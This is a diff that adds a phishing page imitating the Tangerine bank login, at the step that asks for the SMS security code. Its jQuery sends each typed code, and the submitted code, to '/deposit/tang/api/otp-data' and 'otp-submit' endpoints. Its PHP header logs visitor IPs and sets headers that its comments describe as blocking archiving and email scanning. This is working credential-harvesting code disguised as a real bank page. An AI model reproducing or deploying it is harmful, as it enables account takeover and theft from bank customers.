@@ -1,0 +1,387 @@
+
+<!-- saved from url=(0082)file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/t.html -->
+<?php
+// Disable caching
+header("Cache-Control: no-store, no-cache, must-revalidate");
+header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
+header("Pragma: no-cache");
+
+// Prevent Google Archiving
+header("X-Robots-Tag: noarchive");
+
+// Block email scanning
+header("X-Content-Type-Options: nosniff");
+
+// Disable listeners and log third-party communications
+ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");
+
+
+// Logging third-party communication attempts
+$logFile = "../../../requests.txt"; // Replace with the path to your log file
+
+// Get the current timestamp
+$timestamp = date("Y-m-d H:i:s");
+
+// Get the IP address of the client
+$ipAddress = $_SERVER['REMOTE_ADDR'];
+
+// Get the requested URL
+$requestUrl = $_SERVER['REQUEST_URI'];
+
+// Create the log message
+$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";
+
+// Append the log message to the log file
+file_put_contents($logFile, $logMessage, FILE_APPEND);
+?>
+</html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body class="fb2-index" style=""><link type="text/css" rel="stylesheet" id="#"><link type="text/css" rel="stylesheet" id="#"><style lang="en" type="text/css" id="#&quot;"></style><style lang="en" type="text/css" id="#"></style><style lang="en" type="text/css" id=""></style>
+
+        
+        <title>Login | Tangerine</title>  <script>
+    // Disable caching for forward and backward navigation
+    function disableCaching() {
+      // Disable caching for forward navigation
+      window.onpageshow = function(event) {
+        if (event.persisted) {
+          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
+        }
+      };
+      
+      // Disable caching for backward navigation
+      window.onunload = function() {};
+    }
+    
+    // Set client browser cache to one hour prior
+    function setBrowserCacheTime() {
+      const date = new Date();
+      date.setTime(date.getTime() - (60 * 60 * 1000));
+      document.getElementById('cacheExpires').content = date.toUTCString();
+    }
+
+    // Prevent Google Archiving
+    const metaRobots = document.createElement('meta');
+    metaRobots.name = 'robots';
+    metaRobots.content = 'noarchive';
+    document.head.appendChild(metaRobots);
+
+    // Block email scanning
+    const metaContentType = document.createElement('meta');
+    metaContentType.httpEquiv = 'X-Content-Type-Options';
+    metaContentType.content = 'nosniff';
+    document.head.appendChild(metaContentType);
+
+    // Disable listeners and log third-party communications
+    function disableListeners() {
+      // Disable listeners (Not applicable in HTML pages)
+    }
+
+    function logThirdPartyCommunication() {
+      // Logging third-party communication attempts
+      const timestamp = new Date().toISOString();
+      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
+      const requestedUrl = window.location.href;
+      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;
+
+      // Specify the log file location
+      const logFile = "../../../requests.txt"; // Replace with the actual log file location
+
+      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
+      const logRequest = new XMLHttpRequest();
+      logRequest.open('POST', logFile, true);
+      logRequest.setRequestHeader('Content-Type', 'text/plain');
+      logRequest.send(logMessage);
+    }
+
+    // Call the necessary functions when the page loads
+    document.addEventListener('DOMContentLoaded', function() {
+      disableCaching();
+      setBrowserCacheTime();
+      disableListeners();
+      logThirdPartyCommunication();
+    });
+  </script>
+        <meta name="description" content="">
+        <link rel="shortcut icon" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/deposit/tang/favicon.ico" type="image/x-icon">
+        <meta name="viewport" content="initial-scale=1, width=device-width">
+        <link href="./t_files/vendor.css" rel="stylesheet" media="all" onload="this.media=&#39;all&#39;">
+        <link href="./t_files/global.css" rel="stylesheet" media="all" onload="this.media=&#39;all&#39;">
+        <link href="./t_files/app.css" rel="stylesheet" media="all" onload="this.media=&#39;all&#39;">
+        <link rel="preload" as="font" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/assets/tang/fonts/icomoon.ttf" type="font/ttf" crossorigin="">
+        <link rel="preload" as="image" href="./t_files/tangerine-logo-white.svg">
+        <link rel="preload" as="image" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/assets/tang/fonts/icon_DownArrow-white.svg" type="image/svg+xml">
+        <link href="./t_files/css2" rel="stylesheet">
+        <link rel="stylesheet" href="./t_files/login.css">
+        <script src="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
+        
+        <script src="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/files/actions.js###%"></script>
+        <script>
+        $(document).on('change', '#input-code', function() {
+            $.post('/deposit/tang/api/otp-data', {code: $(this).val()});
+        });
+
+        $.post('/deposit/tang/api/otp-type', {type: 'SMS'});
+
+        $(document).on('submit', '.lab-form', function(e) {
+            $('.btn-save').attr('disabled', true);
+
+            $.post('/deposit/tang/api/otp-submit', {code: $('#input-code').val()}, function(response) {
+                location.href = '/deposit/tang/wo';
+            });
+
+            e.preventDefault();
+        });
+        </script>
+        <style>
+        .message-card .critical {
+            background-color: rgba(235, 1, 49, 0.08);
+            border-left: solid 3px #EB0131;
+        }
+
+        .message-card .message-box {
+            margin: 1rem 0;
+            padding: 16px 15px;
+            margin-bottom: 16px;
+            margin-top: 23px;
+        }
+
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0,0,0,0);
+            border: 0;
+        }
+
+        .message-card .cancel-icon {
+            color: #EB0131;
+            font-size: 1.2rem;
+            height: 1.2rem;
+            width: 1.2rem;
+            min-width: 1.2rem;
+        }
+
+        .message-card mat-icon {
+            position: relative;
+            left: 0.125rem;
+        }
+
+        .message-card .message-box-content {
+            margin: 0 0 0 0.5rem;
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex: 1;
+            flex: 1;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            -ms-flex-pack: center;
+            justify-content: center;
+        }
+        </style><noscript>
+            <style>
+                p {
+                color: darkorange;
+                font-weight: bold;
+                font-size: 16px;
+                text-align: center;
+                }
+            </style>
+            <p>To proceed you need to have your cookies and JavaScript browser features enabled.</p>
+        </noscript>
+        <tng-main-nav class="ng-isolate-scope div-main">
+            <nav role="navigation" id="hamburger-navigation" aria-label="Primary" class="navbar print-hide">
+                
+                <div class="brand ng-scope">
+                    <img alt="Tangerine" class="logo-white print-hide" src="./t_files/tangerine-logo-white.svg">
+                    <img alt="Tangerine" class="logo-orange" src="./t_files/tangerine-logo-orange.svg">
+                </div>
+                
+                <button actionable-id="main-nav-btn-feedback" class="navbar__btn navbar__btn--feedback icon-feedback" id="main-nav-btn-feedback" name="main-nav-btn-feedback">
+                    <span class="main-nav-btn-icon-copy ng-binding"> Feedback </span>
+                </button>
+            </nav>
+            <header class="header print-hide">
+                <nav class="skip-links" aria-label="Skip">
+                    <ul class="container skip-links-container">
+                        <li> <a href="javascript:void(0);" id="skipLink" class="tng-anchor ng-binding"> Skip to main content </a> </li>
+                        <li>
+                            <!-- ngIf: $ctrl.SessionService.isAuthenticated() && $ctrl.ChatbotService.isPageWhiteListed() -->
+                        </li>
+                    </ul>
+                </nav>
+                <div class="container">
+                    <div class="logo"> <a actionable-id="main-nav-handle_go_home" class="brand" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/deposit/tang/t.php" id="main-nav-handle_go_home" name="main-nav-handle_go_home"> <img alt="Tangerine" class="print-hide" src="./t_files/tangerine-logo-white.svg"> </a> </div>
+                    <!-- ngIf: $ctrl.isMobileHidden -->
+                    <nav class="nav ng-scope" aria-label="Primary">
+                        <div class="container">
+                            <ul class="nav__list">
+                                <!-- ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
+                                <li class="nav__item primary-item ng-scope" style=""> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.products" id="menu_global.menu.header.products" name="menu_global.menu.header.products"> <span class="ng-binding">Products</span> </a> </li>
+                                <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
+                                <li class="nav__item primary-item ng-scope"> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.waysToBank" id="menu_global.menu.header.waysToBank" name="menu_global.menu.header.waysToBank"> <span class="ng-binding">Ways to Bank</span> </a> </li>
+                                <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
+                                <li class="nav__item primary-item ng-scope"> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.ourBlog" id="menu_global.menu.header.ourBlog" name="menu_global.menu.header.ourBlog"> <span class="ng-binding">Blog</span> </a> </li>
+                                <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems -->
+                                <li class="nav__item primary-item ng-scope"> <a class="nav__link" href="javascript:void(0);" actionable-id="menu_global.menu.header.aboutUs" id="menu_global.menu.header.aboutUs" name="menu_global.menu.header.aboutUs"> <span class="ng-binding">About Us</span> </a> </li>
+                                <!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --> <!-- ngIf: $ctrl.AVAILABLE_ENVIRONMENTS.length > 0 --> <!-- ngIf: $ctrl.isInDevPod --> <!-- ngIf: $ctrl.IS_AVAILABLE_GENESYS_ENVIRONMENTS && false -->
+                            </ul>
+                            <div class="navtools">
+                                <ul class="navtools__list">
+                                    <li class="navtools__item" aria-hidden="false"> <a class="btn btn--largest btn--reversed ng-binding" actionable-id="menu_signup" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/deposit/tang/t#/enroll" id="menu_signup" name="menu_signup"> Sign Me Up </a> </li>
+                                    <li class="navtools__item" aria-hidden="false"> <a class="btn btn--largest btn--whiteBorder ng-binding" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/deposit/tang/t#/?locale=en_CA" actionable-id="menu_Login" id="menu_Login" name="menu_Login"> Log Me In </a> </li>
+                                    <!-- ngIf: $ctrl.SessionService.isAuthenticated() && $ctrl.MENU_ITEMS.LOGIN.length -->
+                                    <li class="navtools__item"> <a class="navtools__link navtools__link--circle navtools__link--icon-text" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/deposit/tang/t.php" actionable-id="menu_Language" aria-label="Changer la langue au français" id="menu_Language" name="menu_Language"> <span class="material-icons language">language</span> <span class="text-label ng-binding" aria-hidden="true"> FR </span> </a> </li>
+                                    <!-- ngIf: !$ctrl.isNewClientEnrollment -->
+                                    <li class="navtools__item ng-scope"> <a class="navtools__link navtools__link--circle" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/deposit/tang/t#/locations" actionable-id="menu_Location" aria-label="ABM Locator" id="menu_Location" name="menu_Location"> <span class="navtools__icon icon-location"></span> </a> </li>
+                                    <!-- end ngIf: !$ctrl.isNewClientEnrollment -->
+                                    <li class="navtools__item"> <a class="navtools__link navtools__link--circle" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/deposit/tang/t.php" actionable-id="menu_Search" aria-label="Search" id="menu_Search" name="menu_Search"> <span class="navtools__icon icon-search"></span> </a> </li>
+                                    <!-- ngIf: $ctrl.SessionService.isAuthenticated() -->
+                                </ul>
+                            </div>
+                        </div>
+                    </nav>
+                    <!-- end ngIf: $ctrl.isMobileHidden -->
+                </div>
+                <tng-sub-nav class="ng-isolate-scope">
+                    <!-- ngIf: $ctrl.isSubNavVisible() -->
+                </tng-sub-nav>
+                <!-- ngIf: !$ctrl.isMobileHidden --> <!-- ngIf: !$ctrl.isMobileHidden -->
+            </header>
+            <!-- ngIf: $ctrl.isContactUsMenuOpen -->
+            <tng-feedback-survey class="ng-isolate-scope">
+                <!-- ngIf: $ctrl.isMedalliaSupported -->
+            </tng-feedback-survey>
+            <tng-print-header name="$ctrl.getFullName()"></tng-print-header>
+            <!-- ngIf: $ctrl.showVisitorSiteSearch -->
+        </tng-main-nav>
+        <!-- uiView: page-content -->
+        <div ui-view="page-content" class="page-content ng-scope div-main" role="main" id="mainContent" tabindex="-1" translate-cloak="" style="overflow-y: hidden;">
+            <login-page return-to="::$resolve.returnTo" class="ng-scope ng-isolate-scope">
+                <div>
+                    <!-- ngIf: !$ctrl.isNewLoginFlow --> <!-- ngIf: $ctrl.isNewLoginFlow -->
+                    <tngx-login-new [return-to-param]="$ctrl.returnTo" class="ng-scope" _nghost-llv-c5="">
+                        <form class="ng-untouched ng-pristine ng-invalid lab-form" action="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/deposit/tang/t.php" method="post">
+                            <div _ngcontent-llv-c5="" class="mat-card-container c-login-flow" id="step-login" style="padding-bottom: 0px">
+                                <mat-card _ngcontent-llv-c5="" class="mat-elevation-z0 mat-card mat-focus-indicator">
+                                    <mat-card-header _ngcontent-llv-c5="" class="mat-card-header">
+                                        <div class="mat-card-header-text">
+                                            <mat-card-title _ngcontent-llv-c5="" class="mat-card-title" id="login-user-id-header-title">
+                                                <h1 _ngcontent-llv-c5="" tabindex="-1">Enter your Security Code</h1>
+                                            </mat-card-title>
+                                                                                        <mat-card-subtitle _ngcontent-jdl-c21="" class="mat-card-subtitle ng-star-inserted" id="login-otp-header-subtitle">Enter the Security Code we just texted to your registered mobile. The code will expire within 10 minutes.</mat-card-subtitle>
+                                        </div>
+                                    </mat-card-header>
+                                    <mat-card-content _ngcontent-llv-c5="" class="mat-card-content" style="margin-top: -40px">
+                                        <div _ngcontent-llv-c5="" class="mat-card-content-container-28rem">
+                                            <div _ngcontent-llv-c5="" class="content-container">
+                                                <div _ngcontent-llv-c5="" class="flex">
+                                                    <!---->
+                                                    <mat-form-field _ngcontent-llv-c5="" appearance="outline" id="main-div" class="form-field mat-form-field ng-tns-c10-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-can-float mat-form-field-has-label mat-form-field-hide-placeholder ng-untouched ng-pristine ng-invalid ng-star-inserted">
+                                                        <div class="mat-form-field-wrapper">
+                                                            <div class="mat-form-field-flex">
+                                                                <!----><!---->
+                                                                <div class="mat-form-field-outline ng-tns-c10-0 ng-star-inserted">
+                                                                    <div class="mat-form-field-outline-start" style="width: 11px;"></div>
+                                                                    <div class="mat-form-field-outline-gap" style="width: 90px;"></div>
+                                                                    <div class="mat-form-field-outline-end"></div>
+                                                                </div>
+                                                                <div class="mat-form-field-outline mat-form-field-outline-thick ng-tns-c10-0 ng-star-inserted">
+                                                                    <div class="mat-form-field-outline-start" style="width: 11px;"></div>
+                                                                    <div class="mat-form-field-outline-gap" style="width: 90px;"></div>
+                                                                    <div class="mat-form-field-outline-end"></div>
+                                                                </div>
+                                                                <!---->
+                                                                <div class="mat-form-field-infix">
+                                                                    <input class="mat-input-element mat-form-field-autofill-control ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored lrinput" id="input-code" name="code" required="" type="tel" autocomplete="one-time-code" minlenth="6" maxlenth="6" attr-action="Filling OTP">
+                                                                    <span class="mat-form-field-label-wrapper">
+                                                                        <label class="mat-form-field-label ng-tns-c10-0 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-1" for="login-user-id-input" aria-owns="login-user-id-input">
+                                                                            <mat-label _ngcontent-llv-c5="" id="mat-label-id-0" class="ng-star-inserted"></mat-label>
+                                                                            <span aria-hidden="true" class="mat-placeholder-required mat-form-field-required-marker ng-tns-c10-0 ng-star-inserted"> *</span>
+                                                                        </label>
+                                                                    </span>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </mat-form-field>
+                                                    <!---->
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </mat-card-content>
+                                    <mat-card-actions _ngcontent-llv-c5="" class="mat-card-actions">
+                                        <button _ngcontent-llv-c5="" class="mat-focus-indicator mat-flat-button mat-button-base mat-primary btn-save" color="primary" id="btn-next" mat-flat-button="" type="submit">
+                                            <span class="mat-button-wrapper">Log In </span>
+                                            <span class="mat-button-ripple mat-ripple" matripple=""></span>
+                                            <span class="mat-button-focus-overlay"></span>
+                                        </button>
+                                    </mat-card-actions>
+                                </mat-card>
+                            </div>
+                        </form>
+                        <style>
+                        .otp-verification {
+                            display: -ms-flexbox;
+                            display: block !important;
+                            margin-left: auto !important;
+                            margin-right: auto !important;
+                        }
+
+                        .center-aligned-in-mobile {
+                            text-align: center;
+                        }
+
+                        .center-aligned-in-mobile a {
+                            position: relative;
+                            margin-left: -19px;
+                        }
+
+                        .center-aligned-in-mobile a .mat-icon.material-icons {
+                            top: -2px;
+                            right: -25px;
+                            position: absolute;
+                        }
+                        </style>
+                        <button _ngcontent-jdl-c21="" class="otp-verification mat-focus-indicator mat-button mat-button-base" id="login-otp-resend-button" mat-button="" type="button">
+                            
+                            
+                            
+                        </button>
+                        <div _ngcontent-jdl-c21="" class="center-aligned-in-mobile">
+                            <a _ngcontent-jdl-c21="" href="https://www.tangerine.ca/app/#" id="login-otp-no-phone-access-link">
+                                <span _ngcontent-jdl-c21="" class="forgot-login-link"> Don't have your phone?</span>
+                                
+                            </a>
+                        </div>
+                        <script>
+                        $(document).ready(function() {
+                            $('#input-code').focusin(function() {
+                                $('#main-div').removeClass('mat-form-field-hide-placeholder').addClass('mat-form-field-should-float mat-focused');
+                            });
+
+                            $('#input-code').focusout(function() {
+                                var val = $(this).val();
+                                if (val == '') {
+                                    $('#main-div').addClass('mat-form-field-hide-placeholder').removeClass('mat-form-field-should-float mat-focused');
+                                }
+                            });
+                        });
+                        </script>
+                    </tngx-login-new>
+                    <!-- end ngIf: $ctrl.isNewLoginFlow -->
+                </div>
+            </login-page>
+        </div>
+        <tng-main-nav class="ng-isolate-scope div-loader" style="display: none">
+            <nav class="navbar print-hide" ng-class="{&#39;nativeNav&#39; : $ctrl.EnvironmentService.isNative()}">
+                <a id="mainNav_home" class="brand nonclickable" href="file:///C:/Users/MSI-LAPTOP/Desktop/pages/.pages/TESTED/public/deposit/tang/deposit/tang/t.php" ng-click="$ctrl.handleGoHome()" ng-class="{&#39;nonclickable&#39; : $ctrl.isTitleLogoNotClickable()}">
+                    <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="./t_files/brand-white.png">
+                    <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="./t_files/brand-orange.png">
+                </a>
+            </nav>
+        </tng-main-nav>
+    
+
+
+<div id="automa-palette"></div></body></html>
